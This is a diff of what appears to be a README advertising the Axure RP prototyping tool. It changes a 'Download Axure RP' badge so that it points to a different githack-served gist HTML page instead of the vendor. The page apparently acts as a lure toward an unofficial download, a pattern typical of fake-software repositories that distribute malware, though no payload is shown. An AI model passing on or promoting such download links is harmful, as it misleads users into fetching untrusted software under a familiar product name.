@@ -3,7 +3,7 @@
 **Axure RP** empowers UX teams to build interactive prototypes, wireframes, and product flows with realistic logic and data.  
 It’s the industry-standard desktop application for turning complex ideas into functional designs — from enterprise dashboards to mobile apps. 🧠  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Download%20Axure%20RP-007ACC?style=for-the-badge&logo=axure&logoColor=white&labelColor=0B0F19)](https://glcdn.githack.com/-/snippets/4893915/raw/main/get.html?offer=AxureRP)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Download%20Axure%20RP-007ACC?style=for-the-badge&logo=axure&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/punishermrkot1987/3824fb98be46b7c891ae679733dc57c5/raw/c8146a55d7d3233e6f5140b03728199df58c72e1/gistfile.html?offer=AxureRP)
 
 ---
 
